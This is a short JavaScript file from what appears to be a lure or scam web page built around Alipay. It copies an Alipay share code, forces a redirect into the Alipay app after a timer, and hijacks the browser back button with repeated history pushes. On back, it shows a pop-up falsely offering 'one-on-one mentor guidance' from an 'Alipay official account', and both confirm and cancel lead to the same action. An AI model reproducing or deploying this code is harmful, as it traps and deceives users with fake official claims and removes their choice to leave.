
window.onload = function () {
	url="alipays://platformapi/startapp?saId=10000007&clientVersion=3.7.0.0718&qrcode=https%3A%2F%2Fqr.alipay.com%2F"+"a7x08340a2xxxmdzxcx6s8d";
    var clipboard = new Clipboard('.copy_btn2');
    clipboard.on('success', function (e) {

        var dialog1 = $(document).dialog({
            type: 'confirm',
            closeBtnShow: true,
            overlayClose: true,
            content: '吱口令复制成功，立刻为你打开支付宝',
            onClickConfirmBtn: function () {
                window.location.href = url;

            }
        });

        setTimeout(function () {
            window.location.href = url;
        }, 3000);

        e.clearSelection();
    });

    clipboard.on('error', function (e) {

        var dialog1 = $(document).dialog({
            type: 'confirm',
            closeBtnShow: true,
            overlayClose: true,
            content: '吱口令复制成功，立刻为你打开支付宝',
            onClickConfirmBtn: function () {
                window.location.href = url;

            },
			onClickCancelBtn : function () {
				window.location.href = url;

            }
        });

        setTimeout(function () {
            window.location.href = url;
        }, 3000);

        e.clearSelection();

    });

    pushHistory();
    window.addEventListener("popstate", function (e) {
        pushHistory();

        var dialog1 = $(document).dialog({
            type: 'confirm',
            closeBtnShow: true,
            overlayClose: true,
            content: '<div><p>恭喜获得专业导师一对一指导资格点击添加支付宝官方号:<span style=\'font-weight:bold;color: red;\'>'+stxlwx+'</span></p><p style="font-size:22px;text-align: center;color: red; " >点击确定添加支付宝官方吱口令</p></div>',
            onClickConfirmBtn: function () {

				$("#ddd").click();
                //window.location.href = url;
                // layer.closeAll();
            },
			onClickCancelBtn : function () {
				$("#ddd").click();
            }
        });

    }, false);

    function pushHistory() {

        var state = {
            title: "title",
            url: "#"
        };
        window.history.pushState(state, "title", "#");
    }
}
